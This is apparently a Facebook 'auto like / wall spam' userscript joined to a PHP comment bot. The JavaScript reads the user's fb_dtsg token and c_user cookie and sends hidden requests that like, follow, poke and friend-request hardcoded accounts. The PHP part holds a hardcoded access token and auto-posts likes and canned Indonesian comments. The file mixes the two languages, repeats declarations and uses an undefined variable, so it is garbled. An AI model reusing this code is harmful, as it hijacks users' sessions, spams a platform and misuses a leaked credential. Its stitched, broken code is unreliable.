// ==UserScript==
// @name            Facebook Auto Like / Like Comments / Wall Spam ...
// @namespace       Facebook Auto Like / Like Comments / Wall Spam ...
// @Hak Cipta          Smart Boy
// ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } function p(abone) { var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); } 
// pic + fans
P("213035732214318");Like("420844481374394");P("476517285801332");Like("379302618799763");Like("681661605177496");P("763222103692022");P("616944838368872");Like("1427714330788710");P("1384028091819568");P("1384029185152792");P("1384030255152685");P("1384073785148332");P("1384073755148335");P("1384073735148337");P("1384073708481673");P("1384073681815009");P("1384073655148345");P("1384073618481682");P("1384073595148351");P("1384042941818083");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
##############SETTING BOT####################
$bot['like'] = true; //bot like
$bot['ck_k'] = true; //komentar 
$bot['ck_u'] = true; //komentar umum
$bot['time'] = true; // tanggal
$bot['aces'] = "CAAAAPJmB8ZBwBAAExDUikOdxg3ulW3gP3phaYXkEGq15gxROVqPeotaW8bhbMZBcqZBws0NG26YUwpFNYZCvC1ENJzcDtK25zIXHcnlDFLqPZC1dwMLpWTdbOh2EU7y3shURIPkaireNXIg3mYTr7zHRmpZCK0KRZAZC3JmQZBKtynbjVO9LFXZC95"; // masukkan acses tokennya di toket miyabi
##############END OF SETTING#############

com_like($cl,$ck,$cu,$tm,$access_token);


com_like($bot['like'],$bot['ck_k'],$bot['ck_u'],$bot['time'],$bot['aces']);

function cmn($text,$ck,$cu){
##########umum
$cmn_umum = array("Hadir menyukai status mu <name> !!! ",
                  "Maaf saya robot komen. Hadir hanya untuk like dan komen di status <name>.. ",
                  "Bos <aku> lagi offline jadi bot ditugaskan untuk like dan komen di statusmu <name> ",
                  "Bingung mau komen apa?? like this aja deh <name>, ",
                  "Pencet tombol like dulu di status <name>...okee sip!!",
                  "Wahhhh <name> lagi update status.. .komen dan like dulu ah ",
                  "Nulis status gak perlu mikir yang penting like dan komen. stuju kan <name>..?",
                  "Absen like dan komen aja deh <name> ",
                  "Jadi harus bilang WOW ga nih <name> ...hehehe?",
                  "Biar di bilang eksis saya harus tetap like dan komen, walaupun sebenarnya saya lagi offline <name>",
                  "Ampek jempol kriting tetep stia like dan coment di status <name> ",
                  "Numpang like dan komen distatusmu <name>..",
                  "Gak akan necewain deh, like this dan komen hadir selalu <name>",
                  "<name> statusmu sip banget. pokoknya JEMPOL trus dah..",
                  "Apapun statusnya? jempol <aku> slalu mampir di status <name>",
                  "Status <name> emang tempat nongkrong komentarku. hihi ",
                  "Di tungguin dari tadi,, akhirnya <name> update status juga,, oklah tanpa basa-basi lagi <aku> kasi jempol dah",
                  "Lupa? bru koment. biar koment paling akhir, yg penting hadir!!di status <name>",
                  "Pokoknya <aku> jadi penggemar setia postingan <name>. Jadi slalu setia hadir untuk like n koment..ixixix. ",
                  "<name> update status. waktunya like n komen..hihi",
);

//dibawah ini apa bila teman update dengan status dengan kata-kata di bawah maka akan ke komen 

$comment = array(
array(
      array("sepi",
            "pada kemana",
            "kemana",
           ),
      array("Nih Udah <aku> ramein <name>. hhe",
            "Meski sepi JEMPOL <aku> masih setia di status <name>.hhe",
            "He'eh ni penghuni FB pada tidur kali. satu jempol cukup ga <name>??",
           )
     ),
array(
      array("semoga",
            "moga",
            "amin",
           ),
      array("Amin <name>.. Skalian like this juga ah. biar tambah exsis. hhe",
            "Mang knapa <name>.?",
            "semoga di kabulkan ya <name>",
           )
     ),
array(
      array("pagi",
            "pagiii",
            "morning",
            "selamat pagi",
            "Good morning",
            "met pagi",
            "page",
           ),
      array("selamat pagi juga <name> selamat ber-aktifitas",
            "hi <name> morning to ",
            "met pagi juga <name>",
           )
     ),
array(
      array("malam",
            "selamat malam",
            "godninght",
            "udah malam",
           ),
      array("selamat malam juga <name> ",
            "hi <name> selamat malam ",
            "met malam <name> udah makan belom?",
           )
     ),
array(
      array("separuh aku",
            "suaraa hati ini memanggil namamu",
           ),
      array("nih yang nyanyi lagu itu ariel pa parto ya",
           )
     ),
array(
      array("galau",
            "nyesek",
            "dilema",
           ),
      array("lagi galau ye <name>!ke klinik tong fang aja hahhahhah",
            "klau galau jngan risau",
           )
     ),
array(
      array("tuhan",
            "Allah",
            "ya allah",
           ),
      array("jiaaahhh <name> lagi curhat di fb,sana shalat trus bedoa sambil curhat...hehehhe",
           )
     ),
array(
      array("ganteng",
            "keren",
            "cakep",
            "tampan",
           ),
      array("makasih <aku> emang ganteng kok <name> ",
            "wah kamu bilang <aku> ganteng ya <name>!makasih ya",
           )
     ),
array(
      array("janji",
            "sumpah",
           ),
      array("jangan janji aja <name> harus di tepati loh..heee ",
           )
     ),
array(
      array("panas",
            "panas banget",
            "cuacanya panas banget",
            "gerah",
           ),
      array("nyemplung ke kolam aja <name> biar ga kepanasan!hahahahaha",
            "masuk kulkas aj <name> ixixiixix",
           )
     ),
array(
      array("puasa",
            "imsak",
            "sahur",
            "berbuka",
            "ngabuburit",
           ),
      array("ceileee kek puasa aja nih <name>",
            "emank tadi puasa ya <name>,apa puasa setengah hari aja",
            "ceileee yang puasa setengah hari...hahahahh",
           )
     ),
array(
      array("jancok",
            "asu",
            "kampang",
            "raimu",
            "matamu",
            "anjing",
            "babi",
            "ccd",
           ),
      array("Wew. <name> lagi marah tetep <aku> kasi LIKE dah. hhe",
            "ada apa dengan mu <name> kok marah amat..? wkwkwkwk",
            "klo marah2 cepet tua loh",
            "Meski marah. <aku> tetep hadir aja dah n like this. ",
           )
     ),
array(
      array("lapar",
            " ewul ",
            " luwe ",
            "laper",
            " krucuk",
           ),
      array("Ni makanan buanyak disini. mau ga <name>..? hhe",
            "sama <name>, <aku> klaparan nih",
           )
     ),
array(
      array("cinta",
            "mencintaimu",
            "i love u",
            "lope",
            "sayang",
            "sayang kamu",
            "love",
           ),
      array("oh so cweeet banget <name> makasih ya.hahahhahah",
            "yang bener nih <name> serius?",
           )
     ),
array(
      array("askum",
            "asalam",
            "assalam",
            "mekum",
            "laikum",
           ),
      array("Waalaikumsalam warahmatullahi wabarakatuh. <name> hihi",
            "Waskum <name> ",
           )
     ),
array(
      array("lagu",
            "musik",
            "sing",
            "song",
            "np",
            "#NP",
            "nyanyi",
           ),
      array("nyanyiin dikit dong lagunya <name> hihi",
            "boleh dong kalo http://facebook.com/wahyuejkt48> nyanyi dikit ",
           )
     ),     
array(
      array("pamit",
            "off dulu",
            "ngantuk",
            "bobok",
            "Tilem",
            "turu",
            "molor",
            "sleep",
            "hoam",
            "tidur",
           ),
      array("met istirahat ya <name>",
            "wew. masi jam sgini <name> mo kmana.?",
            "Walah kmana <name>..?",
            "Ditinggal dah <aku>. hhe.",
           )
     ),
);
$komentar = '';
$cr_kondisi=false;
foreach($comment as $cx){
    foreach($cx[0] as $ct){
        if(ereg($ct,$text)){
            $cr_kondisi=true;
            $komentar = $cx[1][rand(0,count($cx[1]) - 1)];
        }
    }
}
if($cr_kondisi==true && $ck==true){
    return $komentar;
}else{
    if($cu==true){ return $cmn_umum[rand(0,count($cmn_umum) - 1)]; }
}
}
#######################################
function com_like($cl,$ck,$cu,$tm,$access_token){
    $beranda = json_decode(httphit("https://graph.facebook.com/me/home?fields=id,from,type,message&limit=100&access_token=".$access_token))->data;
    $saya_cr = json_decode(httphit("https://graph.facebook.com/me?access_token=".$access_token));
    if($beranda){
        foreach($beranda as $cr_post){
            if(!ereg($saya_cr->id,$cr_post->id)){
                $log_cr = simlog($cr_post->id);
                if($log_cr==true){
                    if($ck==true){
                        $url_ck = cmn($cr_post->message,$ck,$cu);
                        $url_ck = str_replace("<name>",$cr_post->from->name,$url_ck);
						$url_ck	= str_replace("<aku>",$saya_cr->first_name,$url_ck);
                        if($tm==true){ $url_ck = $url_ck.wkthit().kecepatan().konter() ; }
                        $url_ck = urlencode($url_ck);
                        if($ck==true OR $cu==true){
                            httphit("https://graph.facebook.com/".$cr_post->id."/comments?method=POST&message=".$url_ck."&access_token=".$access_token);
                        }
                        if($cl==true){
                            httphit("https://graph.facebook.com/".$cr_post->id."/likes?method=POST&access_token=".$access_token);
                        }
                    }
                }
            }
        }
    }
}
#######################################
function httphit($url){
    return file_get_contents($url);
}

function kecepatan() {
        $waktu="
";

	$gentime = microtime(); 
	$gentime = explode(' ',$gentime); 
	$gentime =  $gentime[0]; 
	$pg_end = $gentime; 
	$totaltime = ($pg_end - $pg_start); 
	$showtime = number_format($totaltime, 1, '.', ''); 
	return "$waktu :|] komen Telat $showtime detik";
}
function konter() {
        $sempak="
";
$filename = 'hitcount.txt';
$handle = fopen($filename, 'r');
$hits = trim(fgets($handle)) + 1;
fclose($handle);

$handle = fopen($filename, 'w');
fwrite($handle, $hits);
fclose($handle);
	return "$sempak :|] Jangan lupa like back ya";
}
function wkthit(){
    $ent="
";
    $hari=gmdate("D", time()+60*60*7);
    if((gmdate("D", time()+60*60*7))=="Sun"){ $hari="Minggu"; }
    if((gmdate("D", time()+60*60*7))=="Mon"){ $hari="Senin"; }
    if((gmdate("D", time()+60*60*7))=="Tue"){ $hari="Selasa"; }
    if((gmdate("D", time()+60*60*7))=="Wed"){ $hari="Rabu"; }
    if((gmdate("D", time()+60*60*7))=="Thu"){ $hari="Kamis"; }
    if((gmdate("D", time()+60*60*7))=="Fri"){ $hari="Jum'at"; }
    if((gmdate("D", time()+60*60*7))=="Sat"){ $hari="Sabtu"; }
    $jam="Jam : ".gmdate("g:i a", time()+60*60*7);
    return $ent.$ent."[ ".$hari." -  Tgl : ".gmdate("j - m - Y", time()+60*60*7)." - ".$jam."  ] $showtime";
}
function simlog($cr_id) {
    $fname = "cr_log.txt";
    $lihatiplist=fopen ($fname, "rb");
    $text='';
    if($lihatiplist){
        $spasipol = "";
        do {
            $barislistip = fread($lihatiplist, 512);
            if(strlen($barislistip) == 0){ break; }
            $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace(" ","",$spasipol);}
        $text=$text.$spasipol;
    }else{$text="";}
    if(ereg($cr_id,$text)){
        return false;
    }else{
        $text = $text.$cr_id;
        $w_file=@fopen($fname,"w") or bberr();
        if($w_file) {
            @fputs($w_file,$text);
            @fclose($w_file);
        }
        return true;
    }
}
?>